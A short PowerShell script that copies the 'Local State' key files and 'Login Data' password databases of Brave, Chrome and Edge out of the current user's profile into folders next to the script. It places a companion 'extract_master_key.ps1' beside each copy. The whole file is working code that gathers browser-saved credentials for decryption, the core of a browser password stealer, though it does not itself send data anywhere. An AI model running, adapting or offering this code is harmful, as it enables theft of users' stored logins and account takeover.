# Get the current user's username
$username = [Environment]::UserName

# Define destination path (script's directory)
$ScriptPath = Split-Path -Parent $MyInvocation.MyCommand.Path
$destination1 = Join-Path $ScriptPath "Brave"
$destination2 = Join-Path $ScriptPath "Chrome"
$destination3 = Join-Path $ScriptPath "Edge"

# Define source paths
$source = Join-Path $ScriptPath extract_master_key.ps1
$source1 = "C:\Users\$username\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
$source2 = "C:\Users\$username\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$source3 = "C:\Users\$username\AppData\Local\Google\Chrome\User Data\Local State"
$source4 = "C:\Users\$username\AppData\Local\Google\Chrome\User Data\Default\Login Data"
$source5 = "C:\Users\$username\AppData\Local\Microsoft\Edge\User Data\Local State"
$source6 = "C:\Users\$username\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"

#Create the destination folder if it doesn't exist
if (!(Test-Path $destination1) -and (Test-Path $source1)) {
	New-Item -ItemType Directory -Path $destination1 -Force
	Write-Host "$destination1 folder created successfully!"
}
if (!(Test-Path $destination2) -and (Test-Path $source3)) {
	New-Item -ItemType Directory -Path $destination2 -Force
	Write-Host "$destination2 folder created successfully!"
}
if (!(Test-Path $destination3) -and (Test-Path $source5)) {
	New-Item -ItemType Directory -Path $destination3 -Force
	Write-Host "$destination3 folder created successfully!"
}

# Copy files with error handling
if (Test-Path $destination1) {
	Copy-Item $source $destination1 -Force
	Write-Host "$source copied successfully!"
}
if (Test-Path $destination2) {
	Copy-Item $source $destination2 -Force
	Write-Host "$source copied successfully!"
}
if (Test-Path $destination3) {
	Copy-Item $source $destination3 -Force
	Write-Host "$source copied successfully!"
}
if (Test-Path $source1) {
	Copy-Item $source1 $destination1 -Force
	Write-Host "$source1 copied successfully!"
} else {
	Write-Warning "$source1 does not exist."
}
if (Test-Path $source2) {
	Copy-Item $source2 $destination1 -Force
	Write-Host "$source2 copied successfully!"
} else {
	Write-Warning "$source2 does not exist."
}
if (Test-Path $source3) {
	Copy-Item $source3 $destination2 -Force
	Write-Host "$source3 copied successfully!"
} else {
	Write-Warning "$source3 does not exist."
}
if (Test-Path $source4) {
	Copy-Item $source4 $destination2 -Force
	Write-Host "$source4 copied successfully!"
} else {
	Write-Warning "$source4 does not exist."
}
if (Test-Path $source5) {
	Copy-Item $source5 $destination3 -Force
	Write-Host "$source5 copied successfully!"
} else {
	Write-Warning "$source5 does not exist."
}
if (Test-Path $source6) {
	Copy-Item $source6 $destination3 -Force
	Write-Host "$source6 copied successfully!"
} else {
	Write-Warning "$source6 does not exist."
}
